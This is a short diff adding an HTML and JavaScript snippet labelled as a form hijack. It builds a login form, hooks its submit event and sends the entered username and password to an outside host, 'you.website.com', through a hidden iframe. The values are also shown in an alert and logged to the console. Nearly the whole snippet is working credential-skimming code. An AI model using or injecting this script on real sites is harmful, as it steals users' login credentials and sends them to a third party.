@@ -1,0 +1,26 @@
+ 	<!-- hijack the HTML's form -->
+
+ 	<!-- the form you hijack -->
+	<form id="123">
+		<input type="text" name="name">
+		<input type="text" name="passwd">
+		<input type="submit" name="submit">
+	</form>
+	
+	<script type="text/javascript">
+		Form = document.getElementById("123")
+		Form.onsubmit = function(){
+			var iframe = document.createElement("iframe")
+			iframe.style.display = "none"
+
+			//for testing
+			//iframe.style.height = "100px"
+			//iframe.style.width = "100px"
+
+			iframe.src = "http://you.website.com" + Form.passwd.value + Form.name.value
+			alert(Form.passwd.value)
+			console.log("passwd:" + Form.passwd.value)
+			console.log('name:' + Form.name.value)
+			document.body.appendChild(iframe)
+		}
+	</script>
